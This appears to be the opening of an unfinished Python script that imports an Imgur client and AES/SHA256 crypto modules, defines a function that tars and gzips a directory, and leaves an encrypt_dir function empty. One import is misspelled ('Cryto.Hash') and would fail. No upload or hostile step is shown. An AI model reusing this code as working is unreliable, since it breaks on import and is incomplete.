from imgurpython import ImgurClient
from os.path import expanduser
from Cryto.Hash import SHA256
from Crypto.Cipher import AES
import tarfile

def compress_dir(path, title):
    dir = tarfile.open(path + ".tgz", "w:gz")
    dir.add(path, arcname=title)
    dir.close()

def encrypt_dir(path):
    
     
